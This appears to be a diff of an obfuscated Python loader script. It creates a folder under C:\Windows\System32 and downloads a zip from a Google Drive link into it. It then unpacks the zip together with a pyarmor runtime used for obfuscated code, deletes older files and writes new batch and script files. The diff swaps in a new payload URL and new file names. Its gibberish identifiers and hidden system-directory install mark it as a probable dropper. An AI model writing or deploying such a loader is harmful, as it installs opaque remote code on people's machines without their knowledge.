@@ -166,9 +166,9 @@ if not os.path.exists(dcnmwxdr):
     os.makedirs(dcnmwxdr)
     os.system('cls')
 def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\WCNMX\aes3.0v2.py"
+    aesv3_path = r"C:\Windows\System32\WCNMX\aespremiumv3.py"
     files_to_delete = [
-        r"C:\Windows\System32\WCNMX\aes3.0v1.py",
+        r"C:\Windows\System32\WCNMX\aes3.0v2.py",
         r"C:\Windows\System32\WCNMX\aes3.0v1.bat",
         r"C:\Windows\System32\WCNMX\pyarmor_runtime_000000"
     ]
@@ -185,6 +185,7 @@ def delete_files_if_aesv3_missing():
                     shutil.rmtree(item)
                     os.system('cls')
                     print("")
+                    print("---Changelog: Added logs")
                     print("")
                     print("")
     else:
@@ -198,8 +199,8 @@ def download_file_from_google_drive(url, output_path):
 
 if not os.path.exists("C:\\Windows\\System32\\WCNMX\\pyarmor_runtime_000000"):
     print("--downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1baNFnp-MewLdwwYfCDqK-d-dyW09XLFt", "C:\\Windows\\System32\\WCNMX\\moonv1.zip")
-    zip_file = r'C:\Windows\System32\WCNMX\moonv1.zip'
+    download_file_from_google_drive("https://drive.google.com/uc?id=1aN3Hx-C0HPhK63oltmP1iTKS581RERdL", "C:\\Windows\\System32\\WCNMX\\nobara.zip")
+    zip_file = r'C:\Windows\System32\WCNMX\nobara.zip'
     extract_dir = r'C:\Windows\System32\WCNMX'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
@@ -213,9 +214,9 @@ os.system('cls')
 if file_contentsx1 =="04yb8u5ih5FGB":
     os.remove(r"C:\Windows\System32\FileSystemXS\aes3.0v1.bat")
     file_contentpathx = read_file_contentxasxas(file_pathxpath)
-    create_batch_file(file_contentpathx, r"C:\Windows\System32\WCNMX\aes3.0v2.py")
+    create_batch_file(file_contentpathx, r"C:\Windows\System32\WCNMX\aespremiumv3.py")
 else:
-    create_batch_file("py", r"C:\Windows\System32\WCNMX\aes3.0v2.py")
+    create_batch_file("py", r"C:\Windows\System32\WCNMX\aespremiumv3.py")
 '''
 directory = r'C:\Windows\System32'
 
